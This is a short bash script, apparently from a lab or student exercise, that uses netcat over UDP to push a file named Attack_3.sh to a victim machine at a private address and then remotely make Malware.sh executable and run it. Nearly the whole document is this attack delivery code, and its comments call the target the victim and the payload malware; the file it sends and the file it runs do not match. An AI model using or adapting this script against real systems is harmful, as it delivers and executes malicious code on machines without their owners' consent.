#!/bin/bash
#This file is used to connect to the open port udp previously found. 
#In case of successful connection it will send the file (Attack_3.sh) on the PC's victim and then execute it 
echo "Attempt on port udp: $1" 
sudo nc -u 192.168.56.106 $1 -w 10  < Attack_3.sh 
sudo nc -u 192.168.56.106 $1 -w 10 << END 
chmod a+x Malware.sh				#this command gives the authorization to execute the files by all the users
./Malware.sh $1					#execute the file (malware) that could be an app and so on
END

